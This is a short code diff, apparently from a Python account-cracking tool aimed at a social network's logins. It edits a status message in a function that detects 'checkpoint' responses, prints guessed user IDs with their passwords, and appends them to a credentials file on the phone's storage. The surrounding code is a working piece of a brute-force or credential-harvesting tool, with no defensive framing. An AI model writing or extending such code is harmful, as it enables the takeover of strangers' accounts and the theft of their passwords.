@@ -630,8 +630,7 @@ def md1(idf,pwv):
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
         if 'y' in cp_xdx:
-         print(f'\r\x1b[38;5;208m [
--Cp] {idf}|{pw}{xxx}')
+         print(f'\r\x1b[38;5;208m [Asdel-Cp] {idf}|{pw}{xxx}')
         open('/sdcard/XYTEEE-XC-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         cp+=1
         break
